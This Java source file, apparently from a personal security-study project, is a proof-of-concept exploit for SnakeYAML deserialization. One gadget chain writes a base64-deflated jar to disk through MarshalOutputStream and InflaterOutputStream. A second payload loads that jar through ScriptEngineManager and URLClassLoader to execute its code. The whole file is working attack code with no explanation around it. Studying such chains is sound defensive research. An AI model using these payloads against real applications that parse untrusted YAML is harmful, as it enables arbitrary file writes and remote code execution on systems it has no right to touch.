package com.idiot9.inner;

import org.yaml.snakeyaml.Yaml;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.Deflater;

public class Marshal {
    public static void main(String[] args) throws IOException {
        marshal("./poc/inner/yaml-payload.jar", "success.jar");
        spi();
    }

    public static void spi() throws IOException {
        Yaml yaml = new Yaml();
        String spi = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"file:///D:/BaiduSyncdisk/code/MyJavaSecStudy/SnakeYaml/success.jar\"]]]]";
        yaml.load(spi);
    }

    public static void marshal(String filePath, String fileName) throws IOException {
        byte[] bytes = Files.readAllBytes(Paths.get(filePath));
        byte[] bytes_zip = deflateZip(bytes);
        String file = Base64.getEncoder().encodeToString(bytes_zip);
        String marshal = "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\""+fileName+"\"],false]," +
                "!!java.util.zip.Inflater { input: !!binary " + file + "},1048576]]";
        Yaml yaml = new Yaml();
        yaml.load(marshal);
    }

    public static byte[] deflateZip(byte[] input){
        Deflater deflater = new Deflater();
        deflater.setInput(input);
        deflater.finish();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        while (!deflater.finished()) {
            int len = deflater.deflate(buf);
            baos.write(buf, 0, len);
        }

        deflater.end();
        return baos.toByteArray();
    }
}
